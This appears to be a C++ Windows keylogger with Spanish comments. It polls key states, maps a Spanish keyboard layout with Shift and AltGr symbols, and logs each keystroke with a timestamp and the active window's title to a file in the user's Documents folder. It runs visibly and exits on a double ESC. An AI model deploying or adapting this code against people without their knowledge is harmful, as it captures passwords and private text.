#include <iostream>
#include <fstream>
#include <windows.h>
#include <shlobj.h>
#include <map>
#include <string>
#include <ctime>

// Mapeo base de teclas (layout español/latinoamericano)
std::map<int, std::string> baseKeys = {
    { 'A',"a" },{ 'B',"b" },{ 'C',"c" },{ 'D',"d" },{ 'E',"e" },{ 'F',"f" },
    { 'G',"g" },{ 'H',"h" },{ 'I',"i" },{ 'J',"j" },{ 'K',"k" },{ 'L',"l" },
    { 'M',"m" },{ 'N',"n" },{ 'O',"o" },{ 'P',"p" },{ 'Q',"q" },{ 'R',"r" },
    { 'S',"s" },{ 'T',"t" },{ 'U',"u" },{ 'V',"v" },{ 'W',"w" },{ 'X',"x" },
    { 'Y',"y" },{ 'Z',"z" },{ '0',"0" },{ '1',"1" },{ '2',"2" },{ '3',"3" },
    { '4',"4" },{ '5',"5" },{ '6',"6" },{ '7',"7" },{ '8',"8" },{ '9',"9" },
    { VK_SPACE," " },{ VK_OEM_1,"ñ" },{ VK_OEM_COMMA,"," },{ VK_OEM_PERIOD,"." },
    { VK_OEM_MINUS,"-" },{ VK_OEM_PLUS,"+" },{ VK_OEM_2,"'" },{ VK_OEM_3,"`" },
    { VK_OEM_4,"{" },{ VK_OEM_5,"\\" },{ VK_OEM_6,"}" },{ VK_OEM_7,"´" }
};

// Devuelve hora actual como string hh:mm:ss
std::string getTimeStamp() {
    time_t now = time(0);
    struct tm t;
    localtime_s(&t, &now);
    char buf[10];
    strftime(buf, sizeof(buf), "%H:%M:%S", &t);
    return std::string(buf);
}

// Devuelve el nombre de la ventana activa
std::string getActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    char title[256] = { 0 };
    GetWindowTextA(hwnd, title, sizeof(title));
    return std::string(title);
}

int main() {
    char path[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, path);
    std::string logFile = std::string(path) + "\\output.log";

    std::map<int, bool> pressed;
    bool escOnce = false;

    std::cout << "Iniciado - Presiona ESC dos veces para salir.\n";

    while (true) {
        Sleep(20);
        std::string window = getActiveWindowTitle();
        std::string time = getTimeStamp();

        bool shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
        bool altgr = GetAsyncKeyState(VK_RMENU) & 0x8000;
        bool ctrl = GetAsyncKeyState(VK_CONTROL) & 0x8000;
        bool capsLock = GetKeyState(VK_CAPITAL) & 0x0001;

        // Teclas base
        for (const auto& [vk, val] : baseKeys) {
            if (GetAsyncKeyState(vk) & 0x8000) {
                if (!pressed[vk]) {
                    std::string output = val;

                    // SHIFT modificadores comunes
                    if (shift) {
                        if (output == "1") output = "!";
                        else if (output == "2") output = "\"";
                        else if (output == "3") output = "·";
                        else if (output == "4") output = "$";
                        else if (output == "5") output = "%";
                        else if (output == "6") output = "&";
                        else if (output == "7") output = "/";
                        else if (output == "8") output = "(";
                        else if (output == "9") output = ")";
                        else if (output == "0") output = "=";
                        else if (output == "+") output = "*";
                        else if (output == "'") output = "?";
                    }

                    // ALTGR
                    if (altgr) {
                        if (output == "2") output = "@";
                        else if (output == "3") output = "#";
                        else if (output == "4") output = "~";
                        else if (output == "e" || output == "E") output = "€";
                    }

                    // Mayúsculas si (Shift XOR CapsLock)
                    if (output.size() == 1 && isalpha(output[0])) {
                        if (shift ^ capsLock) {
                            output[0] = toupper(output[0]);
                        }
                    }

                    std::ofstream file(logFile, std::ios::app);
                    file << "[" << time << "] Tecla: " << output << " (Ventana activa: " << window << ")\n";
                    std::cout << "[" << time << "] Tecla: " << output << " (Ventana activa: " << window << ")\n";
                    file.close();

                    pressed[vk] = true;
                }
            } else {
                pressed[vk] = false;
            }
        }

        // Teclas especiales (SHIFT, CTRL, ALTGR)
        struct {
            int vk;
            std::string name;
        } specials[] = {
            { VK_SHIFT, "SHIFT" },
            { VK_CONTROL, "CTRL" },
            { VK_RCONTROL, "CTRL" },
            { VK_MENU, "ALT" },
            { VK_RMENU, "ALTGR" },
            { VK_CAPITAL, "CAPS LOCK" }
        };

        for (auto& key : specials) {
            if (GetAsyncKeyState(key.vk) & 0x8000) {
                if (!pressed[key.vk]) {
                    std::ofstream file(logFile, std::ios::app);
                    file << "[" << time << "] Tecla especial: " << key.name
                         << " (Ventana activa: " << window << ")\n";
                    file.close();
                    pressed[key.vk] = true;
                }
            } else {
                pressed[key.vk] = false;
            }
        }

        // Salir con doble ESC
        if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) {
            if (escOnce) {
                std::cout << "Saliendo...\n";
                break;
            } else {
                escOnce = true;
                std::cout << "Presiona ESC otra vez para salir.\n";
                Sleep(300);
            }
        } else {
            escOnce = false;
        }
    }

    return 0;
}
